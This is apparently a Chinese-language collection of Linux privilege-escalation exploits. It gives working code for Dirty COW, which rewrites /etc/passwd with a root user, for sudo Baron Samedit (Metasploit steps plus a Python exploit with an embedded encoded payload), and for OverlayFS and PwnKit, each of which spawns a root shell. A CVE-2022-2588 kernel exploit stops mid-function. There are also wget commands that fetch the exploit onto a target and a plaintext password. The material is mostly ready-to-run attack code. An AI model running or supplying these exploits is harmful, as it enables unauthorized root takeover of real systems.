### CVE-2016–5195
脏牛，Linux 内核 2.x ( >= 2.6.22 ) 到 4.x ( < 4.8.3) 中
```C
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "firefart";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo {
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
};

char *generate_password_hash(char *plaintext_pw) {
  return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u) {
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

void *madviseThread(void *arg) {
  int i, c = 0;
  for(i = 0; i < 200000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n",
    from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[])
{
  // backup file
  int ret = copy_file(filename, backup_filename);
  if (ret != 0) {
    exit(ret);
  }

  struct Userinfo user;
  // set values, change as needed
  user.username = "firefart";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw;

  if (argc >= 2) {
    plaintext_pw = argv[1];
    printf("Please enter the new password: %s\n", plaintext_pw);
  } else {
    plaintext_pw = getpass("Please enter the new password: ");
  }

  user.hash = generate_password_hash(plaintext_pw);
  char *complete_passwd_line = generate_passwd_line(user);
  printf("Complete line:\n%s\n", complete_passwd_line);

  f = open(filename, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf("mmap: %lx\n",(unsigned long)map);
  pid = fork();
  if(pid) {
    waitpid(pid, NULL, 0);
    int u, i, o, c = 0;
    int l=strlen(complete_passwd_line);
    for(i = 0; i < 10000/l; i++) {
      for(o = 0; o < l; o++) {
        for(u = 0; u < 10000; u++) {
          c += ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        }
      }
    }
    printf("ptrace %d\n",c);
  }
  else {
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  }

  printf("Done! Check %s to see if the new user was created.\n", filename);
  printf("You can log in with the username '%s' and the password '%s'.\n\n",
    user.username, plaintext_pw);
    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
    backup_filename, filename);
  return 0;
}
```
利用
```Shell
gcc -pthread exploit.c -o exploit -lcrypt
./exploit
# 或
./exploit my-new-password
# 执行过程可能比较慢 要等一会儿！
su firefart

# 用完后记得重置密码
mv /tmp/passwd.bak /etc/passwd
# 复制回去后可以直接修改root密码
passwd
```
可能需要打补丁
```Shell
./exploit
# ./exploit: /lib/x86_64-linux-gnu/libcrypt.so.1: version `XCRYPT_2.0' not found (required by ./exploit)
# ./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found (required by ./exploit)

ldd exploit
# linux-vdso.so.1 (0x00007ffc39190000)
# libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007f8bb5077000)
# libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f8bb5056000)
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8bb4e7d000)
# /lib64/ld-linux-x86-64.so.2 (0x00007f8bb50d3000)
cp /lib/x86_64-linux-gnu/libcrypt.so.1 /tmp/
cp /lib/x86_64-linux-gnu/libc.so.6 /tmp/
cp /lib/x86_64-linux-gnu/libpthread.so.0 /tmp/
cp /lib64/ld-linux-x86-64.so.2 /tmp/
patchelf --replace-needed libcrypt.so.1 /tmp/libcrypt.so.1 ./exploit
patchelf --replace-needed libc.so.6 /tmp/libc.so.6 ./exploit
patchelf --replace-needed libpthread.so.0 /tmp/libpthread.so.0 ./exploit
patchelf --set-interpreter /tmp/ld-linux-x86-64.so.2 ./exploit
cd /tmp
python3 -m http.server 7331

# cd /tmp
wget http://192.168.1.26:7331/libcrypt.so.1
wget http://192.168.1.26:7331/libc.so.6
wget http://192.168.1.26:7331/libpthread.so.0
wget http://192.168.1.26:7331/ld-linux-x86-64.so.2
chmod 755 libcrypt.so.1
chmod 755 libc.so.6
chmod 755 libpthread.so.0
chmod 755 ld-linux-x86-64.so.2

wget http://192.168.1.26:7331/exploit
chmod +x exploit
./exploit
```

### CVE-2021-3156
sudo基于堆的缓冲区溢出，< 1.9.5p2
sudo 1.8.2 - 1.8.31p2
sudo 1.9.0 - 1.9.5p1
Ubuntu 20.04 (Sudo 1.8.31), Debian 10 (Sudo 1.8.27), and Fedora 33 (Sudo 1.9.2)
```Shell
sudo -V

sudoedit -s '\' `perl -e 'print "A" x 65536'`
# malloc(): corrupted top size
# Aborted
```
利用1
```Shell
sudo msfconsole -q

> search CVE-2021-3156
> use exploit/linux/local/sudo_baron_samedit
> show options
# SESSION WritableDir LHOST LPORT

# 建立SESSION 通过SSH
> use auxiliary/scanner/ssh/ssh_login
> show options
# RHOSTS USERNAME PASSWORD
> set RHOSTS 192.168.1.101
> set USERNAME neville
> set PASSWORD bL!Bsg3k
> run

# 建立SESSION 通过反弹Shell
> use exploit/multi/handler
> set LHOST 0.0.0.0
> set ExitOnSession false
> exploit

> use exploit/linux/local/sudo_baron_samedit
> sessions
> set SESSION 0
# 需要提前开启监听
> set LPORT 3333
> run

# 退出
> sessions --kill-all
> exit
```
利用2，需要修改 `SUDO_PATH`
```Python
#!/usr/bin/python3
import os
import subprocess
import sys
from ctypes import cdll, c_char_p, POINTER, c_int, c_void_p

SUDO_PATH = b"/usr/bin/sudo"

libc = cdll.LoadLibrary("libc.so.6")

# don't use LC_ALL (6). it override other LC_
LC_CATS = [
	b"LC_CTYPE", b"LC_NUMERIC", b"LC_TIME", b"LC_COLLATE", b"LC_MONETARY",
	b"LC_MESSAGES", b"LC_ALL", b"LC_PAPER", b"LC_NAME", b"LC_ADDRESS",
	b"LC_TELEPHONE", b"LC_MEASUREMENT", b"LC_IDENTIFICATION"
]

def check_is_vuln():
	# below commands has no log because it is invalid argument for both patched and unpatched version
	# patched version, error because of '-s' argument
	# unpatched version, error because of '-A' argument but no SUDO_ASKPASS environment
	r, w = os.pipe()
	pid = os.fork()
	if not pid:
		# child
		os.dup2(w, 2)
		execve(SUDO_PATH, [ b"sudoedit", b"-s", b"-A", b"/aa", None ], [ None ])
		exit(0)
	# parent
	os.close(w)
	os.waitpid(pid, 0)
	r = os.fdopen(r, 'r')
	err = r.read()
	r.close()
	
	if "sudoedit: no askpass program specified, try setting SUDO_ASKPASS" in err:
		return True
	assert err.startswith('usage: ') or "invalid mode flags " in err, err
	return False

def create_libx(name):
	so_path = 'libnss_'+name+'.so.2'
	if os.path.isfile(so_path):
		return  # existed
	
	so_dir = 'libnss_' + name.split('/')[0]
	if not os.path.exists(so_dir):
		os.makedirs(so_dir)
	
	import zlib
	import base64

	libx_b64 = 'eNqrd/VxY2JkZIABZgY7BhBPACrkwIAJHBgsGJigbJAydgbcwJARlWYQgFBMUH0boMLodAIazQGl\neWDGQM1jRbOPDY3PhcbnZsAPsjIjDP/zs2ZlRfCzGn7z2KGflJmnX5zBEBASn2UdMZOfFQDLghD3'
	with open(so_path, 'wb') as f:
		f.write(zlib.decompress(base64.b64decode(libx_b64)))
	#os.chmod(so_path, 0o755)

def check_nscd_condition():
	if not os.path.exists('/var/run/nscd/socket'):
		return True # no socket. no service
	
	# try connect
	import socket
	sk = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
	try:
		sk.connect('/var/run/nscd/socket')
	except:
		return True
	else:
		sk.close()

	with open('/etc/nscd.conf', 'r') as f:
		for line in f:
			line = line.strip()
			if not line.startswith('enable-cache'):
				continue # comment
			service, enable = line.split()[1:]
			# in fact, if only passwd is enabled, exploit with this method is still possible (need test)
			# I think no one enable passwd but disable group
			if service == 'passwd' and enable == 'yes':
				return False
			# group MUST be disabled to exploit sudo with nss_load_library() trick
			if service == 'group' and enable == 'yes':
				return False
			
	return True

def get_libc_version():
	output = subprocess.check_output(['ldd', '--version'], universal_newlines=True)
	for line in output.split('\n'):
		if line.startswith('ldd '):
			ver_txt = line.rsplit(' ', 1)[1]
			return list(map(int, ver_txt.split('.')))
	return None

def check_libc_version():
	version = get_libc_version()
	assert version, "Cannot detect libc version"
	# this exploit only works which glibc tcache (added in 2.26)
	return version[0] >= 2 and version[1] >= 26

def check_libc_tcache():
	libc.malloc.argtypes = (c_int,)
	libc.malloc.restype = c_void_p
	libc.free.argtypes = (c_void_p,)
	# small bin or tcache
	size1, size2 = 0xd0, 0xc0
	mems = [0]*32
	# consume all size2 chunks
	for i in range(len(mems)):
		mems[i] = libc.malloc(size2)
		
	mem1 = libc.malloc(size1)
	libc.free(mem1)
	mem2 = libc.malloc(size2)
	libc.free(mem2)
	for addr in mems:
		libc.free(addr)
	return mem1 != mem2

def get_service_user_idx():
	'''Parse /etc/nsswitch.conf to find a group entry index
	'''
	idx = 0
	found = False
	with open('/etc/nsswitch.conf', 'r') as f:
		for line in f:
			if line.startswith('#'):
				continue # comment
			line = line.strip()
			if not line:
				continue # empty line
			words = line.split()
			if words[0] == 'group:':
				found = True
				break
			for word in words[1:]:
				if word[0] != '[':
					idx += 1
			
	assert found, '"group" database is not found. might be exploitable but no test'
	return idx

def get_extra_chunk_count(target_chunk_size):
	# service_user are allocated by calling getpwuid()
	# so we don't care allocation of chunk size 0x40 after getpwuid()
	# there are many string that size can be varied
	# here is the most common
	chunk_cnt = 0
	
	# get_user_info() -> get_user_groups() ->
	gids = os.getgroups()
	malloc_size = len("groups=") + len(gids) * 11
	chunk_size = (malloc_size + 8 + 15) & 0xfffffff0  # minimum size is 0x20. don't care here
	if chunk_size == target_chunk_size: chunk_cnt += 1
	
	# host=<hostname>  (unlikely)
	# get_user_info() -> sudo_gethostname()
	import socket
	malloc_size = len("host=") + len(socket.gethostname()) + 1
	chunk_size = (malloc_size + 8 + 15) & 0xfffffff0
	if chunk_size == target_chunk_size: chunk_cnt += 1
	
	# simply parse "networks=" from "ip addr" command output
	# another workaround is bruteforcing with number of 0x70
	# policy_open() -> format_plugin_settings() ->
	# a value is created from "parse_args() -> get_net_ifs()" with very large buffer
	try:
		import ipaddress
	except:
		return chunk_cnt
	cnt = 0
	malloc_size = 0
	proc = subprocess.Popen(['ip', 'addr'], stdout=subprocess.PIPE, bufsize=1, universal_newlines=True)
	for line in proc.stdout:
		line = line.strip()
		if not line.startswith('inet'):
			continue
		if cnt < 2: # skip first 2 address (lo interface)
			cnt += 1
			continue;
		addr = line.split(' ', 2)[1]
		mask = str(ipaddress.ip_network(addr if sys.version_info >= (3,0,0) else addr.decode("UTF-8"), False).netmask)
		malloc_size += addr.index('/') + 1 + len(mask)
		cnt += 1
	malloc_size += len("network_addrs=") + cnt - 3 + 1
	chunk_size = (malloc_size + 8 + 15) & 0xfffffff0
	if chunk_size == target_chunk_size: chunk_cnt += 1
	proc.wait()
	
	return chunk_cnt

def execve(filename, argv, envp):
	libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)
	
	cargv = (c_char_p * len(argv))(*argv)
	cenvp = (c_char_p * len(envp))(*envp)

	libc.execve(filename, cargv, cenvp)

def lc_env(cat_id, chunk_len):
	name = b"C.UTF-8@"
	name = name.ljust(chunk_len - 0x18, b'Z')
	return LC_CATS[cat_id]+b"="+name


assert check_is_vuln(), "target is patched"
assert check_libc_version(), "glibc is too old. The exploit is relied on glibc tcache feature. Need version >= 2.26"
assert check_libc_tcache(), "glibc tcache is not found"
assert check_nscd_condition(), "nscd service is running, exploit is impossible with this method"
service_user_idx = get_service_user_idx()
assert service_user_idx < 9, '"group" db in nsswitch.conf is too far, idx: %d' % service_user_idx
create_libx("X/X1234")

# Note: actions[5] can be any value. library and known MUST be NULL
FAKE_USER_SERVICE_PART = [ b"\\" ] * 0x18 + [ b"X/X1234\\" ]

TARGET_OFFSET_START = 0x780
FAKE_USER_SERVICE = FAKE_USER_SERVICE_PART*30
FAKE_USER_SERVICE[-1] = FAKE_USER_SERVICE[-1][:-1]  # remove last '\\'. stop overwritten

CHUNK_CMND_SIZE = 0xf0

# Allow custom extra_chunk_cnt incase unexpected allocation
# Note: this step should be no need when CHUNK_CMND_SIZE is 0xf0
extra_chunk_cnt = get_extra_chunk_count(CHUNK_CMND_SIZE) if len(sys.argv) < 2 else int(sys.argv[1])

argv = [ b"sudoedit", b"-A", b"-s", b"A"*(CHUNK_CMND_SIZE-0x10)+b"\\", None ]
env = [ b"Z"*(TARGET_OFFSET_START + 0xf - 8 - 1) + b"\\" ] + FAKE_USER_SERVICE
# first 2 chunks are fixed. chunk40 (target service_user) is overwritten from overflown cmnd (in get_cmnd)
env.extend([ lc_env(0, 0x40)+b";A=", lc_env(1, CHUNK_CMND_SIZE) ])

# add free chunks that created before target service_user
for i in range(2, service_user_idx+2):
	# skip LC_ALL (6)
	env.append(lc_env(i if i < 6 else i+1, 0x40))
if service_user_idx == 0:
	env.append(lc_env(2, 0x20)) # for filling hole

for i in range(11, 11-extra_chunk_cnt, -1):
	env.append(lc_env(i, CHUNK_CMND_SIZE))

env.append(lc_env(12, 0x90)) # for filling holes from freed file buffer
env.append(b"TZ=:")  # shortcut tzset function
# don't put "SUDO_ASKPASS" environment. sudo will fail without logging if no segfault
env.append(None)

execve(SUDO_PATH, argv, env)
```

### CVE-2021-3493
Ubuntu OverlayFS 堆叠文件系统本地权限提升
影响版本 内核 `< 5.11`
-   Ubuntu 20.10
-   Ubuntu 20.04 LTS
-   Ubuntu 19.04
-   Ubuntu 18.04 LTS
-   Ubuntu 16.04 LTS
-   Ubuntu 14.04 ESM
```C
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mount.h>

//#include <attr/xattr.h>
//#include <sys/xattr.h>
int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);


#define DIR_BASE    "./ovlcap"
#define DIR_WORK    DIR_BASE "/work"
#define DIR_LOWER   DIR_BASE "/lower"
#define DIR_UPPER   DIR_BASE "/upper"
#define DIR_MERGE   DIR_BASE "/merge"
#define BIN_MERGE   DIR_MERGE "/magic"
#define BIN_UPPER   DIR_UPPER "/magic"


static void xmkdir(const char *path, mode_t mode)
{
    if (mkdir(path, mode) == -1 && errno != EEXIST)
        err(1, "mkdir %s", path);
}

static void xwritefile(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
        err(1, "open %s", path);
    ssize_t len = (ssize_t) strlen(data);
    if (write(fd, data, len) != len)
        err(1, "write %s", path);
    close(fd);
}

static void xcopyfile(const char *src, const char *dst, mode_t mode)
{
    int fi, fo;

    if ((fi = open(src, O_RDONLY)) == -1)
        err(1, "open %s", src);
    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
        err(1, "open %s", dst);

    char buf[4096];
    ssize_t rd, wr;

    for (;;) {
        rd = read(fi, buf, sizeof(buf));
        if (rd == 0) {
            break;
        } else if (rd == -1) {
            if (errno == EINTR)
                continue;
            err(1, "read %s", src);
        }

        char *p = buf;
        while (rd > 0) {
            wr = write(fo, p, rd);
            if (wr == -1) {
                if (errno == EINTR)
                    continue;
                err(1, "write %s", dst);
            }
            p += wr;
            rd -= wr;
        }
    }

    close(fi);
    close(fo);
}

static int exploit()
{
    char buf[4096];

    sprintf(buf, "rm -rf '%s/'", DIR_BASE);
    system(buf);

    xmkdir(DIR_BASE, 0777);
    xmkdir(DIR_WORK,  0777);
    xmkdir(DIR_LOWER, 0777);
    xmkdir(DIR_UPPER, 0777);
    xmkdir(DIR_MERGE, 0777);

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
        err(1, "unshare");

    xwritefile("/proc/self/setgroups", "deny");

    sprintf(buf, "0 %d 1", uid);
    xwritefile("/proc/self/uid_map", buf);

    sprintf(buf, "0 %d 1", gid);
    xwritefile("/proc/self/gid_map", buf);

    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
    if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
        err(1, "mount %s", DIR_MERGE);

    // all+ep
    char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";

    xcopyfile("/proc/self/exe", BIN_MERGE, 0777);
    if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
        err(1, "setxattr %s", BIN_MERGE);

    return 0;
}

int main(int argc, char *argv[])
{
    if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {
        setuid(0);
        setgid(0);
        execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
        err(1, "execl /bin/bash");
    }

    pid_t child = fork();
    if (child == -1)
        err(1, "fork");

    if (child == 0) {
        _exit(exploit());
    } else {
        waitpid(child, NULL, 0);
    }

    execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
    err(1, "execl %s", BIN_UPPER);
}
```

### CVE-2021-4034
Linux Polkit权限提升
查看是否受影响
```Shell
# Ubuntu
dpkg -l policykit-1
# CentOS
rpm -qa polkit
```
不受影响的版本：>=
**CentOS：**
CentOS 6：polkit-0.96-11.el6_10.2
CentOS 7：polkit-0.112-26.el7_9.1
CentOS 8.0：polkit-0.115-13.el8_5.1
CentOS 8.2：polkit-0.115-11.el8_2.2
CentOS 8.4：polkit-0.115-11.el8_4.2
**Ubuntu：**
Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1
Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1
Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6
Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2
Ubuntu 21.10：policykit-1-0.105-31ubuntu0.1
**Debain：**
Debain stretch：policykit-1 0.105-18+deb9u2
Debain buster：policykit-1 0.105-25+deb10u1
Debain bullseye：policykit-1 0.105-31+deb11u1
Debain bookworm,bullseye：policykit-1 0.105-31.1
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell = 
	"#include <stdio.h>\n"
	"#include <stdlib.h>\n"
	"#include <unistd.h>\n\n"
	"void gconv() {}\n"
	"void gconv_init() {\n"
	"	setuid(0); setgid(0);\n"
	"	seteuid(0); setegid(0);\n"
	"	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
	"	exit(0);\n"
	"}";

int main(int argc, char *argv[]) {
	FILE *fp;
	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
	fp = fopen("pwnkit/pwnkit.c", "w");
	fprintf(fp, "%s", shell);
	fclose(fp);
	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
```

### CVE-2022-2588
Linux 3.17 < Linux 5.19
```C
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <assert.h>
#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/timerfd.h>

#include <linux/tc_ematch/tc_em_meta.h>
#include <sys/resource.h>

#include <linux/capability.h>
#include <linux/futex.h>
#include <linux/genetlink.h>
#include <linux/if_addr.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_tun.h>
#include <linux/in6.h>
#include <linux/ip.h>
#include <linux/kcmp.h>
#include <linux/neighbour.h>
#include <linux/net.h>
#include <linux/netlink.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/rtnetlink.h>
#include <linux/tcp.h>
#include <linux/veth.h>

#include <x86intrin.h>

#include <err.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/utsname.h>
#include <unistd.h>

// #define DEBUG

char *target = "/etc/passwd";
char *overwrite =
    "user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash\n";
char *global;
char *self_path;
char *content;

#define PAGE_SIZE 0x1000
#define MAX_FILE_NUM 0x8000

int fds[MAX_FILE_NUM] = {};
int fd_2[MAX_FILE_NUM] = {};
int overlap_a = -1;
int overlap_b = -1;

int cpu_cores = 0;
int sockfd = -1;

int spray_num_1 = 2000;
int spray_num_2 = 4000;

// int spray_num_1 = 4000;
// int spray_num_2 = 5000;

int pipe_main[2];
int pipe_parent[2];
int pipe_child[2];
int pipe_defrag[2];
int pipe_file_spray[2][2];

int run_write = 0;
int run_spray = 0;
char *passwd;
bool overlapped = false;

void DumpHex(const void *data, size_t size) {
#ifdef DEBUG
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char *)data)[i]);
    if (((unsigned char *)data)[i] >= ' ' &&
        ((unsigned char *)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char *)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i + 1) % 8 == 0 || i + 1 == size) {
      printf(" ");
      if ((i + 1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i + 1 == size) {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i + 1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
#endif
}

void pin_on_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    perror("sched_setaffinity()");
    exit(EXIT_FAILURE);
  }
}

static bool write_file(const char *file, const char *what, ...) {
  char buf[1024];
  va_list args;
  va_start(args, what);
  vsnprintf(buf, sizeof(buf), what, args);
  va_end(args);
  buf[sizeof(buf) - 1] = 0;
  int len = strlen(buf);
  int fd = open(file, O_WRONLY | O_CLOEXEC);
  if (fd == -1)
    return false;
  if (write(fd, buf, len) != len) {
    int err = errno;
    close(fd);
    errno = err;
    return false;
  }
  close(fd);
  return true;
}

static void use_temporary_dir(void) {
  system("rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data");
  system("touch exp_dir/data2");
  char *tmpdir = "exp_dir";
  if (!tmpdir)
    exit(1);
  if (chmod(tmpdir, 0777))
    exit(1);
  if (chdir(tmpdir))
    exit(1);
  symlink("./data", "./uaf");
}

static void setup_common() {
  if (mount(0, "/sys/fs/fuse/connections", "fusectl", 0, 0)) {
  }
}

static void adjust_rlimit() {
  struct rlimit rlim;
  rlim.rlim_cur = rlim.rlim_max = (200 << 20);
  setrlimit(RLIMIT_AS, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 32 << 20;
  setrlimit(RLIMIT_MEMLOCK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 136 << 20;
  // setrlimit(RLIMIT_FSIZE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 1 << 20;
  setrlimit(RLIMIT_STACK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 0;
  setrlimit(RLIMIT_CORE, &rlim);
  // RLIMIT_FILE
  rlim.rlim_cur = rlim.rlim_max = 14096;
  if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
    rlim.rlim_cur = rlim.rlim_max = 4096;
    spray_num_1 = 1200;
    spray_num_2 = 2800;
    if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
      perror("setrlimit");
      err(1, "setrlimit");
    }
  }
}

void setup_namespace() {
  int real_uid = getuid();
  int real_gid = getgid();

  if (unshare(CLONE_NEWUSER) != 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    exit(EXIT_FAILURE);
  }

  if (unshare(CLONE_NEWNET) != 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    exit(EXIT_FAILURE);
  }

  if (!write_file("/proc/self/setgroups", "deny")) {
    perror("[-] write_file(/proc/self/set_groups)");
    exit(EXIT_FAILURE);
  }
  if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)) {
    perror("[-] write_file(/proc/self/uid_map)");
    exit(EXIT_FAILURE);
  }
  if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
    perror("[-] write_file(/proc/self/gid_map)");
    exit(EXIT_FAILURE);
  }
}

#define NLMSG_TAIL(nmsg)                                                       \
  ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))

int addattr(char *attr, int type, void *data, int len) {
  struct rtattr *rta = (struct rtattr *)attr;

  rta->rta_type = type;
  rta->rta_len = RTA_LENGTH(len);
  if (len) {
    memcpy(RTA_DATA(attr), data, len);
  }

  return RTA_LENGTH(len);
}

int addattr_l(struct nlmsghdr *n, int maxlen, int type, const void *data,
              int alen) {
  int len = RTA_LENGTH(alen);
  struct rtattr *rta;

  if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
    fprintf(stderr, "addattr_l ERROR: message exceeded bound of %d\n", maxlen);
    return -1;
  }
  rta = NLMSG_TAIL(n);
  rta->rta_type = type;
  rta->rta_len = len;
  if (alen)
    memcpy(RTA_DATA(rta), data, alen);
  n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
  return 0;
}

struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type) {
  struct rtattr *nest = NLMSG_TAIL(n);

  addattr_l(n, maxlen, type, NULL, 0);
  return nest;
}

int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest) {
  nest->rta_len = (void *)NLMSG_TAIL(n) - (void *)nest;
  return n->nlmsg_len;
}

int add_qdisc(int fd) {
  char *start = malloc(0x1000);
  memset(start, 0, 0x1000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new qdisc
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
  msg->nlmsg_type = RTM_NEWQDISC;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));
  // set local
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_parent = TC_H_ROOT;
  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);

  addattr_l(msg, 0x1000, TCA_KIND, "sfq", 4);

  // packing
#ifdef DEBUG
  DumpHex(msg, msg->nlmsg_len);
#endif

  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };
  return sendmsg(fd, &msgh, 0);
}

int add_tc_(int fd, u_int32_t from, u_int32_t to, u_int32_t handle,
            u_int16_t flags) {
  char *start = malloc(0x2000);
  memset(start, 0, 0x2000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | flags;
  msg->nlmsg_type = RTM_NEWTFILTER;
